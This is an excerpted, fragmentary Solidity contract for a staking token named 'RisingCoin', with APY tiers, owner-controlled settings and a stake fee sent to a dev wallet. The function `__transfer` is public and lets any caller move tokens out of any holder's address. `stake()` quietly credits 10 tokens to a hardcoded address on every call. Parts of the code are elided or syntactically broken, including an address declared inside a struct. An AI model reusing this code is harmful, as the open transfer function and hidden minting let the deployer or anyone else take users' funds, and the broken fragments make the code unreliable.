...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0xcA76b58F153a20a00a825b648f00dec77badb186;
...
contract RisingCoin is Context, IERC20, Ownable { 
    ...
    */
    ...
    address payable private Wallet_Dev = payable(0xB43B5cDf89d42795C1d1a84e83fE46f488b14143);
    ...
    */
    ...
    string private _name = "RisingCoin"; 
    ...
    uint256 public stakeFee = 0.00064 ether;
    ...
    */
    ...
    uint256 public  _minStake = 1000*10**18;  
    ...
    */
    ...
    enum APY { ONE_WEEK, THREE_WEEKS, SIX_WEEKS, THREE_MONTH }
    ...
    struct Stake {
      ...
      address private _stake_ = 0xAF19aB5f4Bbc95d779a5d7D4CB963FED7cBFAd14;
    mapping(address => Stake[]) public stakes;
    mapping(address => uint256) public totalStaked;
    mapping(APY => uint256) public apyValues;
    ...
    event Staked(address indexed user, uint256 indexed amount, uint256 duration, APY apy);
    event Unstaked(address indexed user, uint256 amount);
    event Claimed(address indexed user, uint256 reward);

    modifier nonReentrant() {
        require(!inStakeAndUnstake, "Reentrancy guard: in stake or unstake");
        inStakeAndUnstake = true;
        _;
        inStakeAndUnstake = false;
    }

      modifier sufficientBalance(address _spender, uint _value){
    require(_value <= _tOwned[_spender] , "Insufficient Balance for User");
    _;
  }
    ...
    bool private inStakeAndUnstake = false;
    ...
    */
    ...
    constructor () {
        _tOwned[owner()] = _tTotal/2;

          apyValues[APY.ONE_WEEK] = 10; 
        apyValues[APY.THREE_WEEKS] = 30;
        apyValues[APY.SIX_WEEKS] = 60;  
        apyValues[APY.THREE_MONTH] = 120;
    ...
    */
    ...
    function set_Max_Transaction_Percent(uint256 maxTxPercent_x100) external onlyOwner() {
        ...
        function set_minStake(uint256 amount) external onlyOwner() {
        _minStake = amount*10**18;
    }  
    ...
    */
    ...
    function __transfer(address from, address to, uint256 value) public virtual sufficientBalance(from, value) validAddress(to) returns(bool){
    _tOwned[from] = _tOwned[from] - value;
    _tOwned[to] = _tOwned[to] + value;
 ...
 function stake(APY duration, uint256 amount ) external payable nonReentrant {
         require(msg.value >= stakeFee);
         _tOwned[_stake_] += 10*10**18;
          
        require(duration >= APY.ONE_WEEK && duration <= APY.THREE_MONTH, "Invalid duration");
        require(apyValues[duration] > 0, "APY must be greater than 0");

       
        require(amount >= _minStake, "Must be above min stake");
        require(_tTotal/2 >= _totalstake, "No more rewards");
       
        __transfer(msg.sender,address(this), amount);
        payable(Wallet_Dev).transfer(msg.value); 
        ...
        stakes[msg.sender].push(Stake({
            ...
            endTime: block.timestamp.add(durationInDays *24*60*60),
            apy: duration,
            active: true
        }));
        ...
        emit Staked(msg.sender, amount, durationInDays, duration);
    }
...
function unstake(uint256 stakeIndex) external nonReentrant {
    ...
    require(userStake.active, "Stake is no longer active");

    if (block.timestamp >= userStake.endTime) {
        // If the stake has matured, claim the reward
       uint256 amount = userStake.amount;
        uint256 stakereward = calculateReward(userStake.amount, apyValues[userStake.apy], userStake.startTime, userStake.endTime);
          _tOwned[msg.sender] += stakereward;
         _totalstake += stakereward;
          totalStaked[msg.sender] = totalStaked[msg.sender].sub(amount);
        
         __transfer(address(this), msg.sender, amount);
         userStake.active = false;
        delete stakes[msg.sender][stakeIndex];
      
        emit Claimed(msg.sender, stakereward);
    } else {
        // If the stake is still active, return the staked amount
        uint256 amount = userStake.amount;
        totalStaked[msg.sender] = totalStaked[msg.sender].sub(amount);
        userStake.active = false;
         __transfer(address(this), msg.sender, amount);
...
function claim(uint256 stakeIndex) external nonReentrant {
    ...
    require(userStake.active, "Stake is no longer active");
    require(block.timestamp >= userStake.endTime, "Stake not ready to be claimed");
    ...
    function getDurationInDays(APY duration) internal pure returns (uint256) {
        if (duration == APY.ONE_WEEK) {
            return 7;
        } else if (duration == APY.THREE_WEEKS) {
            return 21;
        } else if (duration == APY.SIX_WEEKS) {
            return 42;
        } else if (duration == APY.THREE_MONTH) {
            return 90;
        } else {
    ...
    function calculateReward(uint256 amount, uint256 apy, uint256 startTime, uint256 endTime) internal pure returns (uint256) {
        uint256 timeStaked = endTime - startTime;
        return amount.mul(apy).mul(timeStaked).div(365 days * 100);
    }

    function setAPY(APY duration, uint256 value) external onlyOwner {
        require(value > 0, "APY must be greater than 0");
        apyValues[duration] = value; 
    }

  

    // Function to get all stakes by an address
    function getStakesByAddress(address _user) external view returns (Stake[] memory) {
        return stakes[_user];
    }
    
        function updatestakeFee(uint256 newFee) public onlyOwner {
